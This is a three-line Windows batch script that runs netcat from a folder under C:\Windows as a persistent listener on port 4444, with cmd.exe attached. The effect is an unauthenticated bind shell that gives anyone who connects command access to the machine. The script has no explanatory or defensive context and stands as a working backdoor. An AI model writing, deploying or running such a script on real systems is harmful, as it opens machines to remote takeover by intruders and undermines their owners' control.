@echo off
cd c:\Windows\netcat-1.11\
nc64.exe -Lp 4444 -vv -e cmd.exe
